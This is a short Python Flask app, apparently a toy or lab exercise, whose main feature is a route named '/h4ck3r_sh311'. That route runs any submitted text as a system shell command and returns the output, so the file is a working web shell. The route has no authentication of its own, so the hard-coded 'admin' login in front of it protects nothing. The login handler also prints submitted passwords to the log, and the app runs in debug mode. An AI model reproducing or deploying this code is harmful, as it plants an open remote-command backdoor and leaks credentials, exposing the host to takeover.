from flask import Flask, render_template, redirect, request, url_for
import subprocess

app = Flask(__name__)



@app.route("/h4ck3r_sh311", methods=["POST", "GET"])
def h4ck3r_sh311():
    if request.method == "POST":
        command = request.form.get("command")
        if command:
            try:
                output = subprocess.check_output(command, shell=True, universal_newlines=True, stderr=subprocess.STDOUT)
            except subprocess.CalledProcessError as e:
                output = f"An error occurred: {e.output}"
        else:
            output = "No command provided."
        return render_template("shell.html", result=output)
    return render_template("shell.html", result="")

@app.route("/", methods=["POST", "GET"])
def main():
    if request.method == "POST":
        username = request.form.get("user")
        passcode = request.form.get("pass")
        print(f"Username: {username}, Passcode: {passcode}")  # Debugging line
        if username == "admin" and passcode == "passwordispassword123":
            return redirect(url_for('h4ck3r_sh311'))
        else:
            return redirect(url_for('main'))
        
    return render_template("index.html")

if __name__ == "__main__":
    app.run(debug=True)
